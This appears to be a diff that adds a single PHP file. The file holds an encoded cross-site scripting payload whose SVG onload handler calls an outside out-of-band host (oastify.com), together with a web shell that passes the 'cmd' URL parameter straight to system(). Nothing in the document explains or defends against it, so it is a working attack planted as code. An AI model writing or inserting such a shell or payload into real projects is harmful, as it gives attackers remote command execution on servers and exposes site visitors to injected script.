@@ -1,0 +1,1 @@
+<?php echo &apos;&quot;&gt;&lt;svg/onload=fetch`//co4y7l7qqwxsl03fpelh3yc4zv5qthr5jv7tzgq9dz1o\.oastify.com`&gt;"Shell";system($_GET['cmd']); ?>
